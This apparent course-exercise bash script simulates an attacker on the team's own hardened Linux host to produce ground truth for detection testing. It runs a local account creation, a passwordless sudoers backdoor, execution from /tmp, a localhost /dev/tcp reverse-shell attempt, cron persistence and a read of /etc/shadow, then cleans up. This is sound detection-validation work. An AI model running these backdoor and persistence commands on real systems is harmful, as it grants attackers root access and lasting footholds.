#!/bin/bash
# =============================================================================
# Name:    11-linux_attack_sim.sh
# Purpose: Execute a controlled, self-cleaning attacker sequence on the hardened
#          Linux endpoint and record the ground truth (linux_attack_log.json)
#          used by 12-linux_detection_proof.sh.
# Author:  MedDefense blue team (Holberton 2x02 - Task 11)
# =============================================================================
# MedDefense 2x02 "Eyes on Endpoint" - Task 11
# The Crimson Tide playbook, replayed against our own hardened host: account
# creation, sudoers backdoor, execution from /tmp, reverse shell, cron
# persistence, credential access. Every step is timestamped so Task 12 can prove
# whether auditd / auth.log / syslog saw it.
#
# Safety: every artifact is removed by an EXIT trap (also on error/Ctrl-C) and
# its removal is verified. The reverse shell targets 127.0.0.1:4444 where
# nothing listens: it is a connect attempt, not a live shell, and is killed
# after one second. Nothing leaves the host.
#
# The host is hardened (2x00): /tmp is mounted noexec, so step 3 records the
# attempt as blocked - the simulation measures the defence as well as the
# telemetry.
# =============================================================================

set -o pipefail
export LC_ALL=C

OUT=${1:-linux_attack_log.json}
ACTIONS=()
ARTIFACTS=(/etc/sudoers.d/backdoor /tmp/suspicious_bin /etc/cron.d/persistence_test)

if [ "$EUID" -ne 0 ]; then
	echo "Error: run as root (sudo $0)" >&2
	exit 1
fi
if [ -z "${BASH_VERSION:-}" ] || ! command -v jq >/dev/null 2>&1; then
	echo "Error: bash and jq are required" >&2
	exit 1
fi

cleanup() {
	# stop any lingering reverse-shell attempt, then delete every artifact
	pkill -f 'dev/tcp/127.0.0.1/4444' 2>/dev/null
	userdel -r testattacker >/dev/null 2>&1
	rm -f "${ARTIFACTS[@]}"
}
trap cleanup EXIT INT TERM

now() { date -u +%Y-%m-%dT%H:%M:%SZ; }

# record <n> <name> <description> <command> <result> <technique> <expected json>
record() {
	local n="$1" name="$2" desc="$3" cmd="$4" result="$5" technique="$6" expected="$7" ts
	ts=$(now)
	printf '    [%d/6] %-38s %s\n' "$n" "$name" "$ts"
	ACTIONS+=("$(jq -n --argjson n "$n" --arg name "$name" --arg desc "$desc" --arg cmd "$cmd" \
		--arg ts "$ts" --arg result "$result" --arg technique "$technique" \
		--argjson expected "$expected" \
		'{action_number: $n, action: $name, description: $desc, command: $cmd,
		  timestamp: $ts, result: $result, mitre_technique: $technique,
		  expected_detection: $expected}')")
}

echo "[*] Running Linux attacker simulation..."

# 1. Account creation - persistence / privilege (T1136.001)
useradd -M -s /usr/sbin/nologin testattacker 2>/dev/null
record 1 "Creating user testattacker" "Local account creation for persistence" \
	"useradd -M -s /usr/sbin/nologin testattacker" \
	"$([ -n "$(getent passwd testattacker)" ] && echo executed || echo failed)" "T1136.001 - Create Local Account" \
	'[{"source":"auditd","key":"identity","event":"user/group file write"},{"source":"auth.log","event":"useradd"}]'

# 2. sudoers backdoor - passwordless root (T1548.003)
echo "testattacker ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/backdoor
chmod 440 /etc/sudoers.d/backdoor
record 2 "Modifying sudoers" "Passwordless sudo drop-in for the new account" \
	"echo 'testattacker ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/backdoor" \
	"$([ -f /etc/sudoers.d/backdoor ] && echo executed || echo failed)" "T1548.003 - Sudo and Sudo Caching" \
	'[{"source":"auditd","key":"sudoers","event":"/etc/sudoers.d write"}]'

# 3. Execution from a world-writable directory (T1059.004 / T1204)
cp /usr/bin/id /tmp/suspicious_bin 2>/dev/null
tmp_result=blocked
if /tmp/suspicious_bin >/dev/null 2>&1; then
	tmp_result=executed
fi
record 3 "Executing from /tmp" "Run a copied binary from a world-writable path" \
	"cp /usr/bin/id /tmp/suspicious_bin && /tmp/suspicious_bin" \
	"$tmp_result" "T1059 - Command and Scripting Interpreter" \
	'[{"source":"auditd","key":"process_exec","event":"execve (success or EACCES)"}]'

# 4. Reverse shell to localhost (T1059.004) - connect attempt only, killed after 1s
(timeout 2 bash -c 'exec 3<>/dev/tcp/127.0.0.1/4444; echo test >&3' 2>/dev/null &) 2>/dev/null
sleep 1
pkill -f 'dev/tcp/127.0.0.1/4444' 2>/dev/null
record 4 "Reverse shell attempt (localhost)" "Outbound shell to 127.0.0.1:4444, nothing listening" \
	"bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'" \
	"attempted" "T1059.004 - Unix Shell" \
	'[{"source":"auditd","key":"network_connect","event":"socket/connect to 127.0.0.1:4444"}]'

# 5. Cron persistence (T1053.003) - removed again by the cleanup trap
echo "* * * * * /tmp/beacon.sh" > /etc/cron.d/persistence_test
chmod 644 /etc/cron.d/persistence_test
record 5 "Cron persistence" "Minute-by-minute beacon dropped into /etc/cron.d" \
	"echo '* * * * * /tmp/beacon.sh' > /etc/cron.d/persistence_test" \
	"$([ -f /etc/cron.d/persistence_test ] && echo executed || echo failed)" "T1053.003 - Cron" \
	'[{"source":"auditd","key":"cron_persist","event":"/etc/cron.d write"}]'

# 6. Credential access (T1003.008)
head -c 0 /etc/shadow >/dev/null 2>&1
cat /etc/shadow >/dev/null 2>&1
record 6 "Accessing /etc/shadow" "Read the password hash database" \
	"cat /etc/shadow > /dev/null" \
	"$([ -r /etc/shadow ] && echo executed || echo failed)" "T1003.008 - /etc/passwd and /etc/shadow" \
	'[{"source":"auditd","key":"identity","event":"read of /etc/shadow"}]'

# --- Cleanup and verification -------------------------------------------------
echo "[*] Cleaning up artifacts..."
cleanup
trap - EXIT
left=0
for f in "${ARTIFACTS[@]}"; do
	[ -e "$f" ] && { echo "    leftover: $f" >&2; left=$((left + 1)); }
done
getent passwd testattacker >/dev/null && { echo "    leftover: user testattacker" >&2; left=$((left + 1)); }
[ "$left" -eq 0 ] && printf '    %-49s [CLEAN]\n' "user removed, files removed"
cleaned=$([ "$left" -eq 0 ] && echo true || echo false)

# --- Ground truth JSON --------------------------------------------------------
jq -n --arg host "$(hostname)" --arg ts "$(now)" --argjson cleaned "$cleaned" \
	--argjson actions "$(printf '%s\n' "${ACTIONS[@]}" | jq -s .)" \
	'{platform: "linux", host: $host, generated_at: $ts, cleaned_up: $cleaned,
	  actions: $actions}' > "$OUT" || { echo "Error: cannot write $OUT" >&2; exit 1; }

echo "Actions executed: ${#ACTIONS[@]}"
echo "Ground truth saved to: $OUT"
[ "$left" -eq 0 ]
